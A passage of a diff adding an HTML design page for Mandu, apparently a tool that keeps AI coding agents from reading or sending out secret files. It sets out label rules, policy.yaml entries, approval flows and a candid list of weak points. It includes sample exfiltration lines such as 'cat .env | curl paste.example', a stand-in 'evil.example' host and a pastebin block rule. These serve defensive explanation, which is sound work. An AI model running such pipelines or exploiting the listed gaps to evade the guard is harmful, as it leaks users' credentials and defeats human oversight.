+        <text x="330" y="190" text-anchor="middle" style="fill:var(--fg);font-size:12px">out.txt open for write</text>
+
+        <circle cx="530" cy="210" r="7" style="fill:var(--l-no)"/>
+        <text x="530" y="190" text-anchor="middle" style="fill:var(--fg);font-size:12px">tries to open .env raw</text>
+        <text x="530" y="238" text-anchor="middle" style="fill:var(--deny);font-size:12px;font-weight:600">evil.example ∉ Release(.env)</text>
+        <text x="530" y="254" text-anchor="middle" style="fill:var(--deny);font-size:12px;font-weight:600">→ the read is refused</text>
+        <text x="330" y="240" text-anchor="middle" style="fill:var(--muted);font-size:11px">a file already open for writing</text>
+        <text x="330" y="254" text-anchor="middle" style="fill:var(--muted);font-size:11px">takes the new label on the spot (D5)</text>
+        <path d="M 342 222 C 400 280, 470 280, 522 218" style="fill:none;stroke:var(--muted);stroke-dasharray:3 4"/>
+      </svg>
+    </div>
+    <figcaption><b>Figure 5.</b> <code>Label(h) = ∩ { Release(d) : h has read d raw }</code>. The guard finds a holder's open sinks by reading its descriptor tables from <code>/proc</code> at taint time, so there is no per-holder table to drift. Taint also follows pipes, FIFOs and socket pairs: in <code>python3 -c '…open(".env")…' | curl …</code>, <code>curl</code> becomes a holder (defect D2).</figcaption>
+  </figure>
+
+  <h3>Two more places the label goes</h3>
+  <div class="three" style="grid-template-columns:1fr 1fr">
+    <figure>
+      <div class="frame" style="height:100%">
+        <div class="formula" style="white-space:pre-wrap">Label(copy.txt) = ref{ .env, aws-creds }
+  evaluated at every lookup as
+  ∩ Release(source)</div>
+        <ul style="font-size:.86rem;margin:10px 0 0;padding-left:1.1em;display:flex;flex-direction:column;gap:4px">
+          <li>A revoked binding on a source reaches every copy at once.</li>
+          <li>Level is a floor: a machine may taint, never declassify.</li>
+          <li>Openers and Trust are not inherited; a copy has no reader list.</li>
+          <li>Unknown sources, a cycle, or a chain deeper than 8: bound nowhere.</li>
+        </ul>
+      </div>
+      <figcaption><b>Figure 6.</b> A written file refers to its sources (plan 13 §4.6).</figcaption>
+    </figure>
+    <figure>
+      <div class="frame" style="height:100%">
+        <ol class="ladder" style="counter-reset:s">
+          <li><div><b>Route.</b> The model moves the symbol between cleared points. Zero exposure.</div></li>
+          <li><div><b>Quarantined read.</b> <code>inspect_symbol</code> reads inside the U-LLM and returns a re-symbolized result at the same label. No watermark.</div></li>
+          <li><div><b>In-context read.</b> Desymbolized into the main model's context, logged, and the session watermark rises: <code>sessionLabel = max(…)</code>.</div></li>
+        </ol>
+      </div>
+      <figcaption><b>Figure 7.</b> The three rungs for <span class="lv a">any-model</span> data, cheapest first. After rung 3 every egress of the session needs a bound destination or a human.</figcaption>
+    </figure>
+  </div>
+</section>
+
+<!-- ============ PART 2: RULES ============ -->
+<section>
+  <div class="part"><span class="eyebrow">Part 2</span><h2>The rules</h2></div>
+  <p>The law is one file, <code>policy.yaml</code>, written only by the arbiter and compiled into an immutable policy. Its <code>paths:</code> entries set Release, Openers and Trust per file; <code>user_rules:</code> and <code>rules:</code> govern egress of non-secret masked data.</p>
+
+  <figure>
+    <pre class="yaml"><span class="yk">paths:</span>
+  - <span class="yk">path:</span> ~/proj/deploy.token
+    <span class="yk">level:</span> no-model                 <span class="yc"># no AI model may read it</span>
+    <span class="yk">bindings:</span> [db.internal:5432]    <span class="yc"># Release: where its value may be sent</span>
+    <span class="yk">readers:</span>                        <span class="yc"># Openers: who may open it raw</span>
+      - <span class="yk">app:</span> deploy                  <span class="yc"># pinned by path + hash on first use</span>
+        <span class="yk">prints:</span> nothing             <span class="yc"># your word: deploy is not vetted, so without it deploy gets the twin</span>
+        <span class="yk">output:</span> clear               <span class="yc"># Trust: the AI sees what deploy prints after reading THIS file</span>
+
+  - <span class="yk">path:</span> ~/ws/app/.env
+    <span class="yk">level:</span> no-model
+    <span class="yk">readers:</span>
+      - <span class="yk">app:</span> python3                 <span class="yc"># an interpreter only with its script pinned</span>
+        <span class="yk">script:</span> /opt/tools/deploy.py
+    <span class="yk">others:</span> twin                    <span class="yc"># non-readers get the placeholder copy instead of EACCES</span>
+
+  - <span class="yk">path:</span> ~/.ssh/id_ed25519
+    <span class="yk">level:</span> no-model
+    <span class="yk">readers:</span> [{ <span class="yk">app:</span> ssh, <span class="yk">from:</span> git }]  <span class="yc"># ssh is vetted; only an ssh that git started</span>
+
+  - <span class="yk">path:</span> ~/contracts/**
+    <span class="yk">level:</span> any-model                <span class="yc"># the AI may read these when it asks (logged)</span>
+    <span class="yk">bindings:</span> [smtp.gmail.com]
+
+  - { <span class="yk">path:</span> "**/*.pem", <span class="yk">level:</span> no-model }   <span class="yc"># gitignore-style pattern, never regex</span>
+
+<span class="yk">user_rules:</span>                          <span class="yc"># release rules for masked, non-secret data</span>
+  - { <span class="yk">kind:</span> release, <span class="yk">to:</span> { <span class="yk">host:</span> "*.pastebin.com" }, <span class="yk">mode:</span> block }</pre>
+    <figcaption><b>Figure 8.</b> The keys and the relation each one sets (plan 13 §5.2, <code>docs/usage.md</code>). Per-value <code>values:</code> bindings for structured files are designed, not built. Since 2026-10-04, <code>psql</code> and <code>pg_restore</code> count as printers, so a Postgres login from <code>~/.pgpass</code> fails under Mandu. Since 2026-10-09 <code>PGPASSWORD</code> is masked like any password variable, so a password login fails from the environment too: use peer authentication, or exempt it with <code>env: { exempt: [PGPASSWORD] }</code>, which lets the AI read it.</figcaption>
+  </figure>
+
+  <div class="three" style="grid-template-columns:1fr 1fr">
+    <figure>
+      <div class="frame" style="height:100%">
+        <ol class="ladder">
+          <li><div><b>A literal label</b> on exactly this path.</div></li>
+          <li><div><b>Longest literal prefix</b> among recursive ancestors and matching patterns (<code>/ws/contracts</code> for <code>/ws/contracts/*.md</code>).</div></li>
+          <li><div><b>On a tie</b>, a pattern beats a literal ancestor; between two patterns, the <b>stricter level</b> wins.</div></li>
+          <li><div><b>No entry matches:</b> the catalog (<code>~/.ssh</code>, <code>.env*</code>, cloud configs, ~45 more tools) labels it <span class="lv n">no-model</span>. A derived label is a floor that no pattern can lower.</div></li>
+        </ol>
+      </div>
+      <figcaption><b>Figure 9.</b> Which entry labels a file (confidentiality.md §6.1). Specificity decides; strictness only breaks ties, because a tie is where we don't know what the human meant.</figcaption>
+    </figure>
+    <figure>
+      <div class="frame" style="height:100%">
+        <ol class="ladder">
+          <li><div><b>A standing verdict</b> for this exact item.</div></li>
+          <li><div><b>Your rules</b>: Block beats Ask beats Allow, regardless of specificity. <code>audit</code> counts, never decides.</div></li>
+          <li><div><b>The built-in law</b>, top to bottom, first match wins; its default fails closed.</div></li>
+        </ol>
+        <p class="note" style="margin-top:10px">A <b>secret</b> symbol never yields to a user rule. Its only external release is its own bound destination.</p>
+      </div>
+      <figcaption><b>Figure 10.</b> Egress precedence, printed verbatim in the UI (policy-surface.md §2.4).</figcaption>
+    </figure>
+  </div>
+
+  <figure>
+    <div class="frame">
+      <div class="split">
+        <div class="t">
+          <h4>Tightening · any client</h4>
+          <ul>
+            <li>Raise a level, add a label</li>
+            <li>Remove a binding or an opener</li>
+            <li>Lower a reader's <code>output:</code> toward <code>secret</code></li>
+            <li>Includes the confined agent's policy tools and the suggestion generator (plan 14)</li>
+          </ul>
+        </div>
+        <div class="r">
+          <h4>Relaxing · a human only</h4>
+          <ul>
+            <li>Lower a level</li>
+            <li>Add a binding, an opener, or <code>output:</code> above <code>secret</code></li>
+            <li>Made on the admin channel the agent cannot reach</li>
+            <li>A relaxing hand edit to the file is held as a proposal</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <figcaption><b>Figure 11.</b> The monotonic split (policy-surface.md §8.3). Every relaxation shows in the always-visible Relaxations list with its hits and expiry. Inbox approvals default to <em>once</em>; only <em>Always</em> writes to the policy.</figcaption>
+  </figure>
+</section>
+
+<!-- ============ PART 3: PROVIDING LABELS ============ -->
+<section>
+  <div class="part"><span class="eyebrow">Part 3</span><h2>How labels and policy should reach Mandu</h2></div>
+  <p>Most users should never write the lattice down. The design rule from plan 13 §5 is that people answer questions, and <code>policy.yaml</code> records their answers. Five levels of effort, cheapest first. Each one is a <b>tightening</b> that any client may apply, or a <b>relaxation</b> that only a human may make.</p>
+
+  <figure>
+    <div class="frame">
+      <div class="effort">
+        <div class="st"><div class="bar" style="opacity:.2"></div><span class="who t">nothing to do</span><b>0 · Install</b><span>The catalog labels the usual credential files (SSH, cloud CLIs, <code>.env*</code>, ~45 more tools) <span class="lv n">no-model</span>. Secret-shaped env vars are masked.</span><code>mandu doctor --secrets</code></div>
+        <div class="st"><div class="bar" style="opacity:.4"></div><span class="who t">tightening</span><b>1 · Discover</b><span>Scans of files, git history and Purview labels propose rules. You press Apply.</span><code>mandu policy suggest</code></div>
+        <div class="st"><div class="bar" style="opacity:.55"></div><span class="who t">tightening</span><b>2 · Mark</b><span>Pick a level per file, folder or pattern in the Rules page explorer.</span><code>Rules › Files and folders</code></div>
+        <div class="st"><div class="bar" style="opacity:.75"></div><span class="who r">relaxation · human</span><b>3 · Answer</b><span>Answer an ask: <em>Always</em> writes the binding or the reader for you.</span><code>Approvals</code></div>
+        <div class="st"><div class="bar"></div><span class="who r">loosening held</span><b>4 · Write</b><span>Edit <code>policy.yaml</code>. A loosening edit waits in Approvals until you confirm it.</span><code>~/.mandu/policy.yaml</code></div>
+      </div>
+    </div>
+    <figcaption><b>Figure 12.</b> The effort ladder (plan 13 §5.1, as built). The bar shows how much a user must know. An administrator can also install a read-only layer under <code>/etc/mandu/policy.d/</code>. A user's file may raise its levels but never lower them.</figcaption>
+  </figure>
+
+  <h3>Suggestions</h3>
+  <p>The ladder above works today. These are my proposals for making it easier, ranked by how much friction each removes. Each one keeps the monotonic split: an agent or a scan only proposes, and a human approves every loosening.</p>
+  <div class="ideas">
+    <div class="idea"><span class="st new">proposal</span><h4>1. Ask about destinations, not files</h4><p>Users know "this key is for Stripe" better than they know a level. When a placeholder first heads to a host, the ask should offer <em>Always: bind .env to api.stripe.com</em>. That binding is the only release a <span class="lv n">no-model</span> secret needs. Plan 13 §5.4 designs this row with one <em>Always</em> per source; it is not built yet.</p></div>
+    <div class="idea"><span class="st half">partly built</span><h4>2. Read rules back as sentences</h4><p>Show each file as plain sentences generated from its label: "No AI model may read it. deploy may open it. STRIPE_KEY may be sent only to api.stripe.com." Add the per-principal view too: what may <code>deploy</code> open, and which secrets may reach <code>api.stripe.com</code>. <code>mandu why</code> already answers both questions one at a time (plan 13 §5.3). Built 2026-10-11: each Rules row answers which AI may read it and where it may be sent, and says who opens it; the Rules page's "Who may get your secrets" card is the per-principal view, per program, host and AI (dashboard.md §4.25aa). The full sentences are left.</p></div>
+    <div class="idea"><span class="st new">proposal</span><h4>3. A <code>mandu protect</code> verb</h4><p><code>mandu protect ~/contracts --level no-model</code>. Plan 13 §5.1 records it as proposed; the CLI does not have it. A terminal user can then mark a file without opening the dashboard. Only tightenings are allowed, because the terminal shares a channel with the agent's programs. "Not secret" and lower levels stay on the dashboard.</p></div>
+    <div class="idea"><span class="st new">proposal</span><h4>4. Starter profiles</h4><p>One-click bundles on first run: <em>Developer</em> (cloud CLIs bound to their hosts, <code>ssh from: git</code>), <em>Documents</em> (<code>~/Documents/**</code> at <span class="lv a">any-model</span> with no bindings), <em>Local model</em> (an Ollama entry plus a <span class="lv l">local-model</span> folder). Each bundle shows its <code>policy.yaml</code> diff before it applies, and every relaxation in it is listed.</p></div>
+    <div class="idea"><span class="st new">proposal</span><h4>5. A tighten-only project file</h4><p>A repository could carry <code>.mandu/policy.yaml</code> with labels and patterns only (<code>**/fixtures/*.pem</code> at <span class="lv n">no-model</span>), so a team shares its labels through git. Because the agent can write the repository, the file may only tighten. Bindings, readers and lower levels stay in the human's own file.</p></div>
+    <div class="idea"><span class="st built">built, experimental</span><h4>6. Let a model shape rules from names</h4><p><code>mandu policy suggest --model names</code> sends file names only, and <code>--model contents</code> reads documents only with your own <code>local: true</code> model. Both preview exactly what would be sent before sending it. A model may suggest hiding a file; only you may lower a rule. Turn it on with <code>MANDU_EXPERIMENTAL_POLICY_MODEL=1</code>.</p></div>
+  </div>
+</section>
+
+<!-- ============ PART 4: SETUP + USE CASES ============ -->
+<section>
+  <div class="part"><span class="eyebrow">Part 4</span><h2>Setup and use cases for end users</h2></div>
+  <p>The commands and page names below are the real ones. The screens are drawn mockups of the product dashboard at <code>/</code> (Home · Approvals · Rules · Settings) and of terminal output. Where Mandu's exact wording is not in the docs, the text is illustrative.</p>
+
+  <h3>First ten minutes</h3>
+  <figure>
+    <div class="term"><div class="tbar"><i></i><i></i><i></i></div><pre><span class="dm"># 1. What would a launch hide? Starts no agent, changes nothing.</span>
+<span class="pr">$</span> mandu doctor --secrets
+<span class="dm">  masked     ~/.aws/credentials, ~/.ssh/id_ed25519, ~/proj/.env, … (14 files)</span>
+<span class="dm">  env vars   GH_TOKEN, OPENAI_API_KEY, STRIPE_SECRET_KEY</span>
+<span class="dm">  history    1 key in git history: sk_live_… in config/old.env (commit 3f2a91c), rotate it</span>
+
+<span class="dm"># 2. Close what the scan found: one screen per rule, [a]pply [s]kip [p]olicy lines [q]uit</span>
+<span class="pr">$</span> mandu policy suggest
+
+<span class="dm"># 3. Run the agent behind Mandu (secrets mode is the default)</span>
+<span class="pr">$</span> mandu claude
+<span class="ok">mandu: mode secrets (14 credential files masked, 3 env vars masked, 2 readers pinned)</span>
+
+<span class="dm"># 4. Open the dashboard: Approvals and Rules live there</span>
+<span class="pr">$</span> mandu dashboard</pre></div>
+    <figcaption><b>Figure 13.</b> The setup path from <code>docs/getting-started.md</code>. The launch line is the real format. The doctor lines are abbreviated.</figcaption>
+  </figure>
+
+  <figure>
+    <div class="dash">
+      <div class="top"><span class="brand">Mandu</span><div class="nav"><span>Home</span><span>Approvals<span class="badge">2</span></span><span class="on">Rules</span><span>Settings</span></div><span class="stat">● Protection on</span></div>
+      <div class="body">
+        <div class="describe"><span class="in">Describe what you want, e.g. "my contracts folder may be summarized but never sent anywhere"</span><span class="btn">Suggest rules</span></div>
+        <h5>Files and folders</h5>
+        <div class="tabs"><span class="on">Labeled 4</span><span>All files</span><span>Suggested 2</span></div>
+        <div class="ftab"><table>
+          <thead><tr><th>Name</th><th>No AI</th><th>Your own AI only</th><th>Any AI, when it asks</th><th>Not secret</th><th>May still be sent to</th></tr></thead>
+          <tbody>
+            <tr><td><span class="nm">~/proj/.env</span><span class="src">Your rule</span></td><td><span class="dot s"></span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="nm">api.stripe.com</span><span class="edit">Edit</span></td></tr>
+            <tr><td><span class="nm">~/.ssh/id_ed25519</span><span class="src">Built in: SSH keys</span></td><td><span class="dot r"></span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="edit">Add</span></td></tr>
+            <tr><td><span class="nm">~/notes/board-minutes.md</span><span class="src">Your rule</span></td><td><span class="dot"></span></td><td><span class="dot s"></span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="edit">Add</span></td></tr>
+            <tr><td><span class="nm">~/contracts/</span><span class="src">Your rule · covers 38 files</span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="dot s"></span></td><td><span class="dot"></span></td><td><span class="nm">smtp.gmail.com</span><span class="edit">Edit</span></td></tr>
+            <tr><td><span class="nm">**/fixtures/.env</span><span class="src">Your pattern · matches 3 files</span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="dot"></span></td><td><span class="dot s"></span></td><td></td></tr>
+          </tbody>
+        </table></div>
+        <div class="pending"><span class="msg"><b>Changes to save (1)</b> · ~/contracts → Any AI, when it asks. Changes the label of 38 files, 38 of them more protected.</span><span class="btn">Discard</span><span class="btn p">Save changes</span></div>
+      </div>
+    </div>
+    <figcaption><b>Figure 14.</b> Rules › Files and folders. Each label is a column, strictest on the left. A <span class="dot s" style="vertical-align:-1px"></span> solid dot is your rule on that file. A <span class="dot r" style="vertical-align:-1px"></span> ring is a label that comes from a folder, a pattern or the catalog. Click a dot to change the label. A weaker change is listed for review before Save, and History can undo it. The Suggested tab holds the scan results with "No AI" already pressed. Drawn as of 2026-10-04: since 2026-10-11 each row has two menus instead, one per half of the release set (which AI may read it: the level; where it may be sent: the bindings), and a read-only line naming the programs that may open the file (dashboard.md §4.25p).</figcaption>
+  </figure>
+
+  <figure>
+    <div class="dash">
+      <div class="top"><span class="brand">Mandu</span><div class="nav"><span>Home</span><span class="on">Approvals<span class="badge">2</span></span><span>Rules</span><span>Settings</span></div><span class="stat">● Protection on</span></div>
+      <div class="body">
+        <h5>Waiting for your answer</h5>
+        <div class="card"><span class="h">The program <code>ssh-add</code> wants to read a secret file: <code>id_ed25519</code></span><span class="meta">Session "fix CI" · waiting up to 60 s · ssh-add is vetted not to print the key</span><div class="row"><span class="btn p">Allow once</span><span class="btn">Always allow</span><span class="btn d">Block</span></div></div>
+        <div class="card"><span class="h">A secret from <code>~/proj/.env</code> is about to be sent to <code>hooks.slack.com</code></span><span class="meta">.env may go to: api.stripe.com · sent by node (tool call "npm run notify")</span><div class="row"><span class="btn d">Deny</span><span class="btn">Allow once</span><span class="btn">Always allow</span></div></div>
+        <h5>Rule changes</h5>
+        <div class="card"><span class="h">policy.yaml was changed on disk and would loosen 1 rule</span><span class="meta">adds reader <code>deploy</code> with <code>prints: nothing</code> on ~/proj/deploy.token</span><div class="row"><span class="btn p">Approve</span><span class="btn">Not now</span></div></div>
+      </div>
+    </div>
+    <figcaption><b>Figure 15.</b> Approvals. Three kinds of question reach the human: a program asking for raw bytes (Openers), a send to an unbound host (Release), and a hand edit that loosens the law. Answers default to <em>once</em>; only <em>Always</em> writes to <code>policy.yaml</code>. The first card's wording is from the user guide. The other two are illustrative.</figcaption>
+  </figure>
+
+  <figure>
+    <div class="term"><div class="tbar"><i></i><i></i><i></i></div><pre><span class="pr">$</span> mandu why ~/proj/.env --to api.stripe.com
+~/proj/.env
+  level      Secret, no AI (no-model)
+  because    your label (~/proj/.env)
+  the AI     sees a placeholder copy that keeps the file's structure (dotenv); each secret value Mandu recognizes is a placeholder (1 in the file now)
+  readers    deploy (they read the real file; what they print is masked for the AI)
+  others     programs not listed get the placeholder copy
+  may go to  api.stripe.com
+  send to api.stripe.com: <span class="ok">released: the real value goes out</span>
+
+<span class="pr">$</span> mandu why hooks.slack.com
+hooks.slack.com
+  reachable  yes on :443 (guard rule tcp:*:443, the default any-host HTTPS rule)
+  bound      no secret may be sent here
+  a bound secret sent here:     <span class="ok">released: the real value goes out</span>
+  an unbound secret sent here:  <span class="wa">held for your approval: you answer it on the dashboard's Approvals page (`mandu dashboard`)</span></pre></div>
+    <figcaption><b>Figure 16.</b> <code>mandu why</code> answers from the law in force, names the rule that decided, and never shows a value. The line formats come from <code>launcher/src/why.ts</code>.</figcaption>
+  </figure>
+
+  <h3>Use cases</h3>
+
+  <div class="uc">
+    <span class="who">Developer · API key</span>
+    <h3>Keep the Stripe key from the AI, but let the deploy tool use it</h3>
+    <p class="goal">The agent should be able to run <code>deploy</code>, but it must never see <code>STRIPE_SECRET_KEY</code>. The key may only go to Stripe.</p>
+    <div class="steps2">
+      <div><h4>Dashboard</h4><ol>
+        <li>Rules › Files and folders › All files: open <code>~/proj</code>. The <code>.env</code> row already has a ring under <em>No AI</em> (Built in).</li>
+        <li>Click the solid dot to make it your rule, then under <em>May still be sent to</em> click Add, type <code>api.stripe.com</code>, and press Update.</li>
+        <li>Save changes. Then add <code>deploy</code> as a reader in <code>policy.yaml</code> (right). The edit loosens the law, so Approvals asks you to confirm it once.</li>
+      </ol></div>
+      <div><h4>Terminal + policy.yaml</h4>
+<pre class="yaml">  - <span class="yk">path:</span> ~/proj/.env
+    <span class="yk">level:</span> no-model
+    <span class="yk">bindings:</span> [api.stripe.com]
+    <span class="yk">readers:</span> [{ <span class="yk">app:</span> deploy, <span class="yk">prints:</span> nothing }]
+    <span class="yk">others:</span> twin</pre>
+        <div class="term"><pre><span class="pr">$</span> mandu why ~/proj/.env --to api.stripe.com</pre></div>
+      </div>
+    </div>
+    <p class="result">The AI sees <code>STRIPE_SECRET_KEY=$MDU:nomodel_Read[9bbd].STRIPE_SECRET_KEY</code>. <code>deploy</code> reads the real file, and the key reaches <code>api.stripe.com</code> only. <code>cat .env | curl paste.example</code> carries a placeholder, and a process holding the key cannot send it anywhere else without your OK.</p>
+  </div>
+
+  <div class="uc">
+    <span class="who">Analyst · documents</span>
+    <h3>Let the AI summarize contracts, but never send them out</h3>
+    <p class="goal">Contracts are covered by the vendor's zero-retention agreement, so the model may read them. They must not leave the machine, except as email through Gmail.</p>
+    <div class="steps2">
+      <div><h4>Dashboard</h4><ol>
+        <li>Rules › Files and folders: type <code>~/contracts</code> and click the <em>Any AI, when it asks</em> dot.</li>
+        <li>Under <em>May still be sent to</em>, add <code>smtp.gmail.com</code>.</li>
+        <li>Save. The page lists any part that weakens protection for you to check first, and you can add a reason that History keeps.</li>
+      </ol></div>
+      <div><h4>policy.yaml</h4>
+<pre class="yaml">  - <span class="yk">path:</span> ~/contracts/**
+    <span class="yk">level:</span> any-model
+    <span class="yk">bindings:</span> [smtp.gmail.com]</pre></div>
+    </div>
+    <p class="result">"Summarize nda.pdf" runs as a quarantined read: a separate model call reads the file and returns a placeholder that you see expanded. If the main model must read it in context, that read is logged, and every later send from the session needs a bound host or your OK (the watermark).</p>
+  </div>
+
+  <div class="uc">
+    <span class="who">Researcher · own model</span>
+    <h3>Board minutes only for the model on my own machine</h3>
+    <p class="goal">Board minutes may be read by Ollama on this computer, never by a cloud model.</p>
+    <div class="steps2">
+      <div><h4>Dashboard · Settings › Models</h4>
+        <div class="dash" style="padding:12px"><div class="form">
+          <span class="k">Name</span><span class="v">ollama</span>
+          <span class="k">URL</span><span class="v">http://127.0.0.1:11434</span>
+          <span class="k">Wire</span><span class="v">openai-chat</span>
+          <span class="k">Model</span><span class="v">llama3.2</span>
+          <span class="k">Local</span><span class="v">☑ this model runs inside my trust boundary</span>
+        </div><div class="row" style="display:flex;justify-content:flex-end;margin-top:10px"><span class="btn p">Save model</span></div></div>
+        <ol><li>Then in Rules, click <em>Your own AI only</em> on <code>~/notes/board-minutes.md</code>.</li></ol>
+      </div>
+      <div><h4>policy.yaml</h4>
+<pre class="yaml"><span class="yk">models:</span>
+  - { <span class="yk">name:</span> ollama, <span class="yk">url:</span> http://127.0.0.1:11434,
+      <span class="yk">wire:</span> openai-chat, <span class="yk">model:</span> llama3.2, <span class="yk">local:</span> true }
+<span class="yk">paths:</span>
+  - <span class="yk">path:</span> ~/notes/board-minutes.md
+    <span class="yk">level:</span> local-model</pre></div>
+    </div>
+    <p class="result">Claude sees <code>$MDU:localmodel_…</code> and can ask the quarantined helper, which sends the read only to <code>ollama</code>. If Ollama is down, the read is refused, never rerouted. Mandu decides <code>local</code> from your declaration, never from the address.</p>
+  </div>
+
+  <div class="uc">
+    <span class="who">Everyone · git over ssh</span>
+    <h3>git push works, but the agent cannot read my ssh key</h3>
+    <div class="steps2">
+      <div><h4>What happens by default</h4><ol>
+        <li><code>~/.ssh/id_ed25519</code> is in the catalog, so it is <span class="lv n">no-model</span> with no setup.</li>
+        <li><code>ssh</code> is vetted, so it may read the key. Limit it to ssh started by git.</li>
+        <li><code>git</code> itself is a printer, so <code>git</code> never gets the key file.</li>
+      </ol></div>
+      <div><h4>policy.yaml</h4>
+<pre class="yaml">  - <span class="yk">path:</span> ~/.ssh/id_ed25519
+    <span class="yk">level:</span> no-model
+    <span class="yk">readers:</span> [{ <span class="yk">app:</span> ssh, <span class="yk">from:</span> git }]
+<span class="yk">ssh_agent:</span>
+  <span class="yk">readers:</span> [ssh-add, { <span class="yk">app:</span> ssh, <span class="yk">from:</span> git }]</pre></div>
+    </div>
+  </div>
+
+  <div class="uc">
+    <span class="who">Gotcha · recent change</span>
+    <h3>My Postgres login from <code>~/.pgpass</code> stopped working</h3>
+    <p class="goal">Since 2026-10-04, <code>psql</code> and <code>pg_restore</code> count as printers: <code>psql -f</code>, <code>\i</code> and <code>\copy … from</code> print a file, and <code>psql</code> runs shell commands. No entry can make them readers, and Postgres has no placeholder release on the wire. Since 2026-10-09 <code>PGPASSWORD</code> is masked too. The ways out:</p>
+    <div class="term"><pre><span class="dm"># peer authentication over the local socket: no password at all</span>
+<span class="dm">#   unix_sockets: { allow: [/var/run/postgresql] }   (~/.mandu/policy.yaml)</span>
+<span class="dm"># or let the AI read the password: exempt it, then launch with it</span>
+<span class="dm">#   env: { exempt: [PGPASSWORD] }</span>
+<span class="pr">$</span> PGPASSWORD=… mandu claude
+<span class="dm"># or vouch for pg_dump, or a program of yours (never psql), as the reader, and bind the database:</span>
+<span class="dm">#   readers: [{ app: pg_dump, prints: nothing }]   bindings: ["db.internal:5432"]</span>
+<span class="pr">$</span> mandu why ~/.pgpass      <span class="dm"># names psql as a printer and says why</span></pre></div>
+  </div>
+
+  <div class="uc">
+    <span class="who">Organization · Purview</span>
+    <h3>Use the sensitivity labels we already have</h3>
+    <div class="steps2">
+      <div><h4>Dashboard · Settings › Sensitivity labels</h4><ol>
+        <li>The list shows each label found in your Office files, with a file count.</li>
+        <li>Name each one and pick a level, for example Highly Confidential → <span class="lv n">no-model</span>, General → <span class="lv p">public</span>.</li>
+        <li>Rules › Suggested › Scan for keys turns each labelled file into a suggestion.</li>
+      </ol></div>
+      <div><h4>policy.yaml + terminal</h4>
+<pre class="yaml"><span class="yk">sensitivity_labels:</span>
+  - { <span class="yk">id:</span> 9fbde396-…, <span class="yk">name:</span> Highly Confidential, <span class="yk">level:</span> no-model }</pre>
+        <div class="term"><pre><span class="pr">$</span> mandu policy suggest --root ~/Documents</pre></div>
+      </div>
+    </div>
+    <p class="result">Mandu reads only the label id, never the document text. An administrator can map labels for everyone under <code>/etc/mandu/policy.d/</code>. Your mapping can raise theirs but never lower it.</p>
+  </div>
+</section>
+
+<!-- ============ PART 5: ASSESSMENT ============ -->
+<section>
+  <div class="part"><span class="eyebrow">Part 5</span><h2>Adopting the reader-set model: what is good and what is bad</h2></div>
+  <p>Most of Plan 13 is built: D1 to D9 are fixed, along with the intersection join, <code>output:</code> on the reader entry, labels by reference, the flow rules and the reader allow-list. Adopting it means accepting the model as the end state and finishing what is not built yet: <code>values:</code>, the <em>This session</em> scope, the sentences, the per-principal view, one <em>Always</em> per source, synced folders and typed quarantined results. This assessment is dated 2026-10-04.</p>
+  <div class="split">
+    <div class="t">
+      <h4>Good</h4>
+      <ul>
+        <li><b>One check for every flow.</b> <code>Label(holder) = ∩ Release(d)</code>, checked at the later of the source and sink events, answers the model, network, write and pipeline exits alike. D1 (union) and D2 (pipelines) became visible as departures from one formula.</li>
+        <li><b>Three questions kept apart.</b> Release travels with the data, Openers is checked at the open, and Trust affects only what the model sees. <code>output: clear</code> cannot become an exfiltration rule.</li>
+        <li><b>Fail-closed by construction.</b> The join is intersection, copies are evaluated live against their sources, unknown or cyclic sources are bound nowhere, and since D8 (12) the reader list is an allow-list, so a newly found printer is closed by default.</li>
+        <li><b>The user sees a ladder.</b> On models, the levels stay a total order (the four columns of the Rules page). Only destinations are set-valued, and they already were (<code>bindings</code>).</li>
+        <li><b>The provider is a sink.</b> At <span class="lv n">no-model</span>, even the quarantined helper never sees the bytes. That gives data residency while still using vendor models.</li>
+        <li><b>The monotonic split.</b> The agent and the scans can only tighten. Every loosening is a human act on a channel the agent cannot reach.</li>
+      </ul>
+    </div>
+    <div class="r">
+      <h4>Bad</h4>
+      <ul>
+        <li><b>Intersection costs utility, paid in asks.</b> A holder of two differently bound secrets may send nowhere, and a session's destinations can empty after two rung-3 reads with no display (R3 left). One <em>Always</em> per source is not built (R2). Users approve about 97% of permission prompts, so asks risk becoming rubber stamps.</li>
+        <li><b><code>prints: nothing</code> is the weak point.</b> Only <code>ssh</code> and <code>ssh-add</code> are vetted. <code>aws</code>, <code>kubectl</code>, <code>helm</code> and <code>docker</code> need the human's word, and the word is unchecked (<code>kubectl config view --raw</code> prints the file it would vouch for). A <code>~/.pgpass</code> login fails.</li>
+        <li><b>Usability leans on TLS inspection.</b> Unvetted HTTPS clients work because the proxy puts the value back at a bound host. Non-HTTP protocols (Postgres) and pinned certificates get no release.</li>
+        <li><b>Many knobs.</b> A level, <code>bindings</code>, <code>readers</code>, <code>prints</code>, <code>output</code>, <code>mask</code>, <code>others</code>, <code>from</code>, <code>script</code>, <code>sha256</code>, and later <code>values:</code>. The read-back that makes answering questions safe (the sentences and the per-principal view) is not built.</li>
+        <li><b>Tree-wide taint over-masks.</b> Programs are not sinks, so one raw read makes the whole call's output secret by default. Plan 10's spike measured about 1% of tool results masked before <code>readers:</code> were in wide use.</li>
+        <li><b>Soundness is claimed, not proven</b> (§6.3 item 1). The §4.9 leftovers remain: names, timing and signal channels, host relays, an inbound accept, a Unix socket connected before the taint, the guard-only <code>lstat</code>. No live drill combines readers across two files, a pipeline and a redirect. macOS is deny-only and unverified.</li>
+        <li><b>Ongoing maintenance.</b> The printer and code-runner lists are kept in three copies, every vetted reader needs a probe on a real host, and a mislabeled secret still leaks silently.</li>
+      </ul>
+    </div>
+  </div>
+  <h3>Recommendation</h3>
+  <ol class="ladder">
+    <li><div><b>Canonical catalog bindings (R5).</b> The AWS symbol releases at <code>*.amazonaws.com</code> with no <code>policy.yaml</code>. This removes the commonest asks.</div></li>
+    <li><div><b>Make the intersection visible.</b> Name the blocking source, with one <em>Always</em> per source (R2). Show the session's destinations, and ask before a rung-3 read empties them (R3).</div></li>
+    <li><div><b>Probe, then vet.</b> Probe <code>aws</code>, <code>gh</code>, <code>kubectl</code> and <code>pg_dump</code> to grow the vetted list, rather than relying on <code>prints: nothing</code>. When a user is asked to vouch, show that program's known printing subcommands.</div></li>
